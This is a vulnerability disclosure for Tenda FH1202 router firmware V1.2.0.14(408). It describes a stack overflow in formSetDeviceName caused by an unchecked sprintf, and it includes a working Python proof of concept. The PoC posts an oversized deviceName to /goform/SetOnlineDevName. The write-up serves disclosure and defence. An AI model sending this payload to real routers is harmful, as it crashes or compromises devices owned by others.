## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2079.html

## Affected version

FH1202 V1.2.0.14(408)

## Vulnerability details

The Tenda FH1202 V1.2.0.14(408) has a stack overflow vulnerability located in the `formSetDeviceName` function. This function accepts the `deviceName` parameter from a POST request. However, since the user has control over the input of `deviceName`, the statement `sprintf(v6, "%s;1", v3);` leads to a buffer overflow. The user-supplied `deviceName` can exceed the capacity of the `v6` array, thus triggering this security vulnerability.

![image-20240319231222137](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319231222137.png)

![image-20240319231231748](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319231231748.png)

## PoC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetOnlineDevName"
payload = b"a"*2000

data = {"deviceId": 1,"deviceName": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240319231402982](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319231402982.png)